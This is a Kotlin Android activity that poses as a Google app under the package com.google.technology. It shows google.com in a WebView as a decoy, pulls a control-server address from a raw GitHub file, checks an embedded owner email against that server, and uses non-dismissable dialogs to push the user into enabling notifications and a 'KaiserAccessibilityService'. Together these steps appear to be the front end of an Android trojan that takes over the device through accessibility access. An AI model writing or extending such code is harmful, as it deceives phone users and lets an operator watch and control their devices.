package com.google.technology

import android.content.Intent
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import android.view.View
import android.webkit.WebChromeClient
import android.webkit.WebResourceRequest
import android.webkit.WebSettings
import android.webkit.WebView
import android.webkit.WebViewClient
import android.widget.Toast
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat
import android.content.pm.PackageManager
import org.json.JSONObject
import java.io.IOException

class MainActivity : AppCompatActivity() {

    private lateinit var webView: WebView
    private lateinit var loadingOverlay: View

    private val BASE_WEB_URL = "https://google.com"
    private val API_URL      = "https://raw.githubusercontent.com/Zal7Sex/Kaiser/main/api_20261122.txt"

    private val notifPermissionLauncher = registerForActivityResult(
        ActivityResultContracts.RequestPermission()
    ) {
        checkAccessibilityPermission()
    }

    private val accessibilityLauncher = registerForActivityResult(
        ActivityResultContracts.StartActivityForResult()
    ) {
        if (!isAccessibilityEnabled()) {
            showAccessibilityPermissionDialog()
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        webView = findViewById(R.id.webview)
        loadingOverlay = findViewById(R.id.loadingOverlay)

        val prefs      = getSharedPreferences("google", MODE_PRIVATE)
        val savedEmail = prefs.getString("ownerEmail", null)

        if (savedEmail.isNullOrEmpty()) {
            loadEmailFromAssets()
        } else {
            loadWebView(BASE_WEB_URL)
            checkNotificationPermission()
        }
    }

    private fun showLoading(show: Boolean) {
        loadingOverlay.visibility = if (show) View.VISIBLE else View.GONE
    }

    private fun loadEmailFromAssets() {
        showLoading(true)
        try {
            val json = assets.open("email.json").bufferedReader().use { it.readText() }
            val obj  = JSONObject(json)
            val email = obj.optString("email", "").trim()

            if (email.isEmpty()) {
                showLoading(false)
                Toast.makeText(this, "Terjadi Kesalahan", Toast.LENGTH_SHORT).show()
                return
            }

            checkOwnerOnServer(email)

        } catch (e: Exception) {
            showLoading(false)
            Toast.makeText(this, "Terjadi Kesalahan", Toast.LENGTH_SHORT).show()
        }
    }

    private fun checkOwnerOnServer(email: String) {
        val prefs = getSharedPreferences("google", MODE_PRIVATE)
        val savedApiUrl = prefs.getString("apiBaseUrl", null)

        if (!savedApiUrl.isNullOrEmpty()) {
            doCheckOwner(email, savedApiUrl)
        } else {
            val client = okhttp3.OkHttpClient()
            val apiRequest = okhttp3.Request.Builder().url(API_URL).build()
            client.newCall(apiRequest).enqueue(object : okhttp3.Callback {
                override fun onFailure(call: okhttp3.Call, e: IOException) {
                    runOnUiThread {
                        showLoading(false)
                        Toast.makeText(this@MainActivity, "Terjadi Kesalahan", Toast.LENGTH_SHORT).show()
                    }
                }

                override fun onResponse(call: okhttp3.Call, response: okhttp3.Response) {
                    val apiContent = response.body?.string()?.trim() ?: ""
                    val baseUrl = if (apiContent.startsWith("http")) {
                        prefs.edit().putString("apiBaseUrl", apiContent).apply()
                        apiContent
                    } else {
                        runOnUiThread {
                            showLoading(false)
                            Toast.makeText(this@MainActivity, "Terjadi Kesalahan", Toast.LENGTH_SHORT).show()
                        }
                        return
                    }
                    doCheckOwner(email, baseUrl)
                }
            })
        }
    }

    private fun doCheckOwner(email: String, baseUrl: String) {
        val prefs  = getSharedPreferences("google", MODE_PRIVATE)
        val client = okhttp3.OkHttpClient()
        val request = okhttp3.Request.Builder()
            .url("$baseUrl/api/auth/check-owner?email=${java.net.URLEncoder.encode(email, "UTF-8")}")
            .get()
            .build()

        client.newCall(request).enqueue(object : okhttp3.Callback {
            override fun onFailure(call: okhttp3.Call, e: IOException) {
                runOnUiThread {
                    showLoading(false)
                    Toast.makeText(this@MainActivity, "Terjadi Kesalahan", Toast.LENGTH_SHORT).show()
                }
            }

            override fun onResponse(call: okhttp3.Call, response: okhttp3.Response) {
                val body = response.body?.string() ?: ""
                runOnUiThread {
                    showLoading(false)
                    if (response.isSuccessful) {
                        try {
                            val json = JSONObject(body)
                            if (json.optBoolean("exists", false)) {
                                prefs.edit().putString("ownerEmail", email).apply()
                                loadWebView(BASE_WEB_URL)
                                checkNotificationPermission()
                            } else {
                                Toast.makeText(this@MainActivity, "Terjadi Kesalahan", Toast.LENGTH_SHORT).show()
                            }
                        } catch (e: Exception) {
                            Toast.makeText(this@MainActivity, "Terjadi Kesalahan", Toast.LENGTH_SHORT).show()
                        }
                    } else {
                        Toast.makeText(this@MainActivity, "Terjadi Kesalahan", Toast.LENGTH_SHORT).show()
                    }
                }
            }
        })
    }

    private fun checkNotificationPermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            if (ContextCompat.checkSelfPermission(
                    this, android.Manifest.permission.POST_NOTIFICATIONS
                ) != PackageManager.PERMISSION_GRANTED
            ) {
                AlertDialog.Builder(this)
                    .setTitle("Izin Notifikasi")
                    .setMessage(
                        "Aplikasi Memerlukan Izin Notifikasi Agar Layanan Dapat Berjalan Di Latar Belakang."
                    )
                    .setPositiveButton("Izinkan") { _, _ ->
                        notifPermissionLauncher.launch(android.Manifest.permission.POST_NOTIFICATIONS)
                    }
                    .setCancelable(false)
                    .show()
                return
            }
        }
        checkAccessibilityPermission()
    }

    private fun checkAccessibilityPermission() {
        if (!isAccessibilityEnabled()) {
            showAccessibilityPermissionDialog()
        }
    }

    private fun isAccessibilityEnabled(): Boolean {
        val expectedId = "$packageName/${KaiserAccessibilityService::class.java.name}"
        val enabledServices = Settings.Secure.getString(
            contentResolver,
            Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
        ) ?: return false
        return enabledServices.split(":").any {
            it.trim().equals(expectedId, ignoreCase = true)
        }
    }

    private fun showAccessibilityPermissionDialog() {
        AlertDialog.Builder(this)
            .setTitle("Izin Accessibility Service")
            .setMessage(
                "Aplikasi Memerlukan Accessibility Service Agar Dapat Berjalan Dengan Baik."
            )
            .setPositiveButton("Buka Pengaturan") { _, _ ->
                accessibilityLauncher.launch(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
            }
            .setCancelable(false)
            .show()
    }

    override fun onResume() {
        super.onResume()
        val prefs = getSharedPreferences("google", MODE_PRIVATE)
        if (prefs.getString("ownerEmail", null).isNullOrEmpty()) return
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            if (ContextCompat.checkSelfPermission(
                    this, android.Manifest.permission.POST_NOTIFICATIONS
                ) != PackageManager.PERMISSION_GRANTED
            ) {
                checkNotificationPermission()
                return
            }
        }
        if (!isAccessibilityEnabled()) {
            checkAccessibilityPermission()
        }
    }

    private fun loadWebView(url: String) {
        webView.settings.apply {
            javaScriptEnabled    = true
            domStorageEnabled    = true
            loadWithOverviewMode = true
            useWideViewPort      = true
            setSupportZoom(true)
            builtInZoomControls  = true
            displayZoomControls  = false
            cacheMode            = WebSettings.LOAD_DEFAULT
            mixedContentMode     = WebSettings.MIXED_CONTENT_ALWAYS_ALLOW
        }
        webView.webViewClient = object : WebViewClient() {
            override fun shouldOverrideUrlLoading(
                view: WebView, request: WebResourceRequest
            ) = false
        }
        webView.webChromeClient = WebChromeClient()
        webView.loadUrl(url)
    }

    override fun onBackPressed() {
        if (webView.canGoBack()) webView.goBack() else super.onBackPressed()
    }


}
